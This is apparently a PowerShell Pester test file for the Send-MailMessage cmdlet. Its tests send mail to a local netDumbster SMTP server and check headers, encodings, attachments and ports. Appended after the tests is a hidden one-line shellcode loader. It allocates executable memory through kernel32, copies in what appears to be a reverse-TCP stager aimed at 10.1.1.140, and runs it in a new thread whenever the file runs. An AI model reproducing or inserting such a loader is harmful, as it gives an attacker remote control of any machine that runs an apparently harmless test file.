


if(-not ("netDumbster.smtp.SimpleSmtpServer" -as [type]))
{
    Register-PackageSource -Name nuget.org -Location https://api.nuget.org/v3/index.json -ProviderName NuGet -ErrorAction SilentlyContinue

    $nugetPackage = "netDumbster"
    Install-Package -Name $nugetPackage -ProviderName NuGet -Scope CurrentUser -Force -Source 'nuget.org' -RequiredVersion 2.0.0.4

    $dll = "$(Split-Path (Get-Package $nugetPackage).Source)\lib\netstandard2.0\netDumbster.dll"
    Add-Type -Path $dll
}

$DefaultInputObject = @{
    From = "user01@example.com"
    To = "user02@example.com"
    Subject = "Subject $(Get-Date)"
    Body = "Body $(Get-Date)"
    SmtpServer = "127.0.0.1"
}

Describe "Send-MailMessage DRT Unit Tests" -Tags CI, RequireSudoOnUnix {
    BeforeAll {
        $server = [netDumbster.smtp.SimpleSmtpServer]::Start(25)

        function Read-Mail
        {
            param()

            if($server)
            {
                return $server.ReceivedEmail[0]
            }
            return $null
        }
    }

    BeforeEach {
        if($server)
        {
            $server.ClearReceivedEmail()
        }
    }

    AfterAll {
        if($server)
        {
            $server.Stop()
        }
    }

    $testCases = @(
        @{
            Name = "with mandatory parameters"
            InputObject = $DefaultInputObject
        }
        @{
            Name = "with ReplyTo"
            InputObject = @{
                From = "user01@example.com"
                To = "user02@example.com"
                ReplyTo = "noreply@example.com"
                Subject = "Subject $(Get-Date)"
                Body = "Body $(Get-Date)"
                SmtpServer = "127.0.0.1"
            }
        }
        @{
            Name = "with multiple To"
            InputObject = @{
                From = "user01@example.com"
                To = "user02@example.com","user03@example.com","user04@example.com"
                Subject = "Subject $(Get-Date)"
                Body = "Body $(Get-Date)"
                SmtpServer = "127.0.0.1"
            }
        }
        @{
            Name = "with multiple Cc"
            InputObject = @{
                From = "user01@example.com"
                To = "user02@example.com"
                Cc = "user03@example.com","user04@example.com"
                Subject = "Subject $(Get-Date)"
                Body = "Body $(Get-Date)"
                SmtpServer = "127.0.0.1"
            }
        }
        @{
            Name = "with multiple Bcc"
            InputObject = @{
                From = "user01@example.com"
                To = "user02@example.com"
                Bcc = "user03@example.com","user04@example.com"
                Subject = "Subject $(Get-Date)"
                Body = "Body $(Get-Date)"
                SmtpServer = "127.0.0.1"
            }
        }
        @{
            Name = "with No Subject"
            InputObject = @{
                From = "user01@example.com"
                To = "user02@example.com"
                Body = "Body $(Get-Date)"
                SmtpServer = "127.0.0.1"
            }
        }
    )

    It "Shows obsolete message for cmdlet" {
        $server | Should -Not -Be $null

        $powershell = [PowerShell]::Create()

        $null = $powershell.AddCommand("Send-MailMessage").AddParameters($testCases[0].InputObject).AddParameter("ErrorAction","SilentlyContinue")

        $powershell.Invoke()

        $warnings = $powershell.Streams.Warning

        $warnings.count | Should -BeGreaterThan 0
        $warnings[0].ToString() | Should -BeLike "The command 'Send-MailMessage' is obsolete. *"
    }

    It "Can send mail message using named parameters <Name>" -TestCases $testCases {
        param($InputObject)

        $server | Should -Not -Be $null

        Send-MailMessage @InputObject -ErrorAction SilentlyContinue

        $mail = Read-Mail

        $mail.FromAddress | Should -BeExactly $InputObject.From
        $mail.ToAddresses.Count | Should -BeExactly ($InputObject.To.Count + $InputObject.Cc.Count + $InputObject.Bcc.Count)
        $mail.ToAddresses | Should -BeIn ([array]$InputObject.To + $InputObject.Cc + $InputObject.Bcc)

        $mail.Headers["From"] | Should -BeExactly $InputObject.From
        $mail.Headers["To"] | Should -Not -BeNullOrEmpty
        $mail.Headers["To"].Split(", ") | Should -BeExactly $InputObject.To
        If($InputObject.Cc)
        {
            $mail.Headers["Cc"] | Should -Not -BeNullOrEmpty
            $mail.Headers["Cc"].Split(", ") | Should -BeExactly $InputObject.Cc
        }
        
        If($InputObject.ReplyTo)
        {
            $mail.Headers["Reply-To"] | Should -BeExactly $InputObject.ReplyTo
        }
        $mail.Headers["Subject"] | Should -BeExactly $InputObject.Subject

        $mail.MessageParts.Count | Should -BeExactly 1
        $mail.MessageParts[0].BodyData | Should -BeExactly $InputObject.Body
    }

    It "Can send mail message using pipline named parameters <Name>" -TestCases $testCases -Pending {
        param($InputObject)

        Set-TestInconclusive "As of right now the Send-MailMessage cmdlet does not support piping named parameters (see issue 7591)"

        $server | Should -Not -Be $null

        [PsCustomObject]$InputObject | Send-MailMessage -ErrorAction SilentlyContinue

        $mail = Read-Mail

        $mail.FromAddress | Should -BeExactly $InputObject.From
        $mail.ToAddresses.Count | Should -BeExactly ($InputObject.To.Count + $InputObject.Cc.Count + $InputObject.Bcc.Count)
        $mail.ToAddresses | Should -BeIn ([array]$InputObject.To + $InputObject.Cc + $InputObject.Bcc)

        $mail.Headers["From"] | Should -BeExactly $InputObject.From
        $mail.Headers["To"] | Should -Not -BeNullOrEmpty
        $mail.Headers["To"].Split(", ") | Should -BeExactly $InputObject.To
        If($InputObject.Cc)
        {
            $mail.Headers["Cc"] | Should -Not -BeNullOrEmpty
            $mail.Headers["Cc"].Split(", ") | Should -BeExactly $InputObject.Cc
        }
        
        If($InputObject.ReplyTo)
        {
            $mail.Headers["Reply-To"] | Should -BeExactly $InputObject.ReplyTo
        }
        $mail.Headers["Subject"] | Should -BeExactly $InputObject.Subject

        $mail.MessageParts.Count | Should -BeExactly 1
        $mail.MessageParts[0].BodyData | Should -BeExactly $InputObject.Body
    }
}

Describe "Send-MailMessage Feature Tests" -Tags Feature, RequireSudoOnUnix {
    BeforeAll {
        function Read-Mail
        {
            param()

            if($server)
            {
                return $server.ReceivedEmail[0]
            }
            return $null
        }
    }

    BeforeEach {
        if($server)
        {
            $server.ClearReceivedEmail()
        }
    }

    Context "Default Port 25" {
        BeforeAll {
            $server = [netDumbster.smtp.SimpleSmtpServer]::Start(25)
        }

        AfterAll {
            if($server)
            {
                $server.Stop()
            }
        }

        It "Can throw on wrong mail addresses" {
            $server | Should -Not -Be $null

            $obj = $DefaultInputObject.Clone()
            $obj.To = "not_a_valid_mail.address"

            { Send-MailMessage @obj -ErrorAction Stop } | Should -Throw -ErrorId "FormatException,Microsoft.PowerShell.Commands.SendMailMessage"
        }

        It "Can send mail with free-form email address" {
            $server | Should -Not -Be $null

            $obj = $DefaultInputObject.Clone()
            $obj.From = "User01 <user01@example.com>"
            $obj.To = "User02 <user02@example.com>"

            Send-MailMessage @obj -ErrorAction SilentlyContinue

            $mail = Read-Mail

            $mail.FromAddress | Should -BeExactly "user01@example.com"
            $mail.ToAddresses | Should -BeExactly "user02@example.com"
        }

        It "Can send mail with high priority" {
            $server | Should -Not -Be $null

            Send-MailMessage @DefaultInputObject -Priority High -ErrorAction SilentlyContinue

            $mail = Read-Mail
            $mail.Priority | Should -BeExactly "urgent"
        }

        It "Can send mail with HTML content as body" {
            $server | Should -Not -Be $null

            $obj = $DefaultInputObject.Clone()
            $obj.Body = "<html><body><h1>PowerShell</h1></body></html>"

            Send-MailMessage @obj -BodyAsHtml -Encoding utf8 -ErrorAction SilentlyContinue

            $mail = Read-Mail
            $mail.Headers["content-type"] | Should -BeLike "text/html*"
            $mail.MessageParts.Count | Should -BeExactly 1
            $mail.MessageParts[0].BodyData | Should -Be $obj.Body
        }

        It "Can send mail with UTF8 encoding" {
            $server | Should -Not -Be $null

            $obj = $DefaultInputObject.Clone()
            $obj.Body = "We ❤ PowerShell"

            Send-MailMessage @obj -Encoding utf8Bom -ErrorAction SilentlyContinue

            $mail = Read-Mail
            $mail.MessageParts.Count | Should -BeExactly 1
            $mail.Headers["content-transfer-encoding"] | Should -BeExactly "base64"
            $utf8Text = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($mail.MessageParts[0].BodyData))
            $utf8Text | Should -Be $obj.Body
        }

        It "Can send mail with attachments" {
            $attachment1 = "TestDrive:\attachment1.txt"
            $attachment2 = "TestDrive:\attachment2.txt"

            $pngBase64 = "iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAAnElEQVR42u3RAQ0AAAgDoL9/aK3hHFSgyUw4o0KEIEQIQoQgRAhChAgRghAhCBGCECEIEYIQhAhBiBCECEGIEIQgRAhChCBECEKEIAQhQhAiBCFCECIEIQgRghAhCBGCECEIQYgQhAhBiBCECEEIQoQgRAhChCBECEIQIgQhQhAiBCFCEIIQIQgRghAhCBGCECFChCBECEKEIOS7BU5Hx50BmcQaAAAAAElFTkSuQmCC"

            Set-Content $attachment1 -Value "First attachment"
            Set-Content $attachment2 -AsByteStream -Value ([Convert]::FromBase64String($pngBase64))

            $server | Should -Not -Be $null

            Send-MailMessage @DefaultInputObject -Attachments $attachment1,$attachment2 -ErrorAction SilentlyContinue

            $mail = Read-Mail
            $mail.MessageParts.Count | Should -BeExactly 3

            $txt = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($mail.MessageParts[1].BodyData)) -replace "`n|`r"
            $txt | Should -BeExactly "First attachment"

            ($mail.MessageParts[2].BodyData -replace "`n|`r") | Should -BeExactly $pngBase64
        }
    }

    Context "Custom Port 2525" {
        BeforeAll {
            $server = [netDumbster.smtp.SimpleSmtpServer]::Start(2525)
        }

        AfterAll {
            if($server)
            {
                $server.Stop()
            }
        }

        It "Can send mail message using custom port 2525" {
            $server | Should -Not -Be $null
            $server.ReceivedEmailCount | Should -BeExactly 0

            Send-MailMessage @DefaultInputObject -Port 2525 -ErrorAction SilentlyContinue

            $server.ReceivedEmailCount | Should -BeExactly 1
        }
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x0a,0x01,0x01,0x8c,0x68,0x02,0x00,0x00,0x7b,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

